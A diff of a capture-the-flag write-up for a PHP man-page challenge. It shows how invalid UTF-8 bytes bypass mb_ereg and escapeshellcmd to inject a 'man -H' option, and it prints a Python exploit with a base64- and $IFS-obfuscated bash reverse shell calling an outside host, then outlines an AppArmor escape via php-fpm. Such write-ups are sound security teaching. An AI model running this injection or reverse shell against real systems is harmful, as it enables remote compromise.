@@ -1,15 +1,66 @@
-UTF-8 handling in PHP is [weird](https://gist.github.com/doc-smith/83f686e331fe172bf0f414adf26f483a).
-Combined with the `-H` option of `man`, this gets us a reverse shell for free:
-```python
-import base64
-import requests
+This challenge is a PHP application that renders the man page for a given command as HTML. The command is taken from the query string and passed as an argument to `/usr/bin/man` via `shell_exec()`:
+```php
+$arg = $_GET['page'];
+[...]
+$manpage = shell_exec('/usr/bin/man --troff-device=html --encoding=UTF-8 ' . $arg);
+```
 
-REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts libz.so | cut -d" " -f1`/31337 0>&1'
+This would be a straight-up RCE, if it wasn't for an ad-hoc query sanitizer slapped on top of this:
+
+1. Quotes of all kinds are stripped right away: `$arg = mb_ereg_replace('["\']', '', $arg);`.
+2. If there are non-word characters at the beggining of a token (`if (mb_ereg('(^|\\s+)\W+', $arg) [...] ) {`), they are also stripped: `$arg = mb_ereg_replace('(^|\\s+)\W+', '\\1', $arg);`. This prevents us from passing additional funny `-Options` or `--options` to `/usr/bin/man`.
+3. Finally, `$arg = escapeshellcmd($arg)` escapes pretty much everything we could use in a shell command for malicious purposes.
+
+At first glance, this seems surprisingly solid. But, unfortunately for the author of the sanitizer and fortunately for us, the challenge tries to use UTF-8:
+```php
+mb_regex_encoding('utf-8') or die('Invalid encoding');
+mb_internal_encoding('utf-8') or die('Invalid encoding');
+setlocale(LC_CTYPE, 'en_US.utf8');
+```
+
+In fact, strings in PHP are just old-school byte sequences. All `mb_internal_encoding()/mb_regex_encoding()` do is simply set the `encoding` parameters for `mb_*` functions, which will then handle the bytes accordingly. If the bytes we provide to these functions are not actually valid UTF-8, well, tough luck:
+```php
+<?php
+    mb_regex_encoding('utf-8');
+    mb_internal_encoding('utf-8');
+    setlocale(LC_CTYPE, 'en_US.utf8');
+
+    $valid_utf8 = "-Evil";
+    // 0xCA is 0b11001010
+    //   which means a continuation byte in the form of 10xxxxxx
+    //   must immediately follow it => this is incorrect UTF-8
+    $invalid_utf8 = "\xca" . $valid_utf8;
+
+    // The original valid UTF-8 triggers the sanitizer,
+    // so this prints "Uh-oh, busted.".
+    if (mb_ereg("(^|\\s+)\W+", $valid_utf8)) {
+        echo "Uh-oh, busted.", PHP_EOL;
+    } else {
+        echo "Go ahead.", PHP_EOL;
+    }
+
+    // However, regular expression functions silently fail
+    // on invalid UTF-8, which means this prints "Go ahead."
+    if (mb_ereg("(^|\\s+)\W+", $invalid_utf8)) {
+        echo "Uh-oh, busted.", PHP_EOL;
+    } else {
+        echo "Go ahead.", PHP_EOL;
+    }
+
+    // After that, escapeshellcmd() simply drops the invalid character,
+    // which is exactly what we want (i.e., this prints "bool(true)").
+    var_dump($valid_utf8 === escapeshellcmd($invalid_utf8));
+?>
+```
+
+Great, so this allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from, but the most obvious one is `-H`, which allows us to specify a web browser to view the man page. `escapeshellcmd()` still escapes everything, but that escaping only works for the shell that PHP runs to execute `/usr/bin/man`. The shell that `/usr/bin/man` itself spawns to invoke the browser will see unescaped characters. This [gets us](get_shell.py) a reverse shell:
+```python
+REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
+# Space is not escaped by escapeshellcmd(), so we have use $IFS here.
 SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
 CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'
 
-MAAS_HOST = '127.0.0.1'
-URL = f'http://{MAAS_HOST}:8820/'
+[...]
 
 requests.get(URL, params={
 	'page': CGI_READY_REV_SHELL,
@@ -22,7 +73,7 @@ At this point, if we knew the name of the flag file, we could just `cat` it. Unf
 
 php-fpm, though, is not confined to any AppArmor policy. Even better, our reverse shell is running as `www-data` and we can talk to PHP via a UNIX socket (`/run/php/php7.3-fpm.sock`).
 
-Let's trick PHP into revealing the contents of `/`! PHP (php-fpm) speaks [FastCGI](http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html), which seems moderately annoying to implement.
+The obvious idea is to trick PHP into revealing the contents of `/`. PHP (php-fpm) speaks [FastCGI](http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html), which seems moderately annoying to implement.
 In order to avoid that, we spin up another instance of `nginx` with a custom config pointed at `/tmp/evil`.
 
 ```
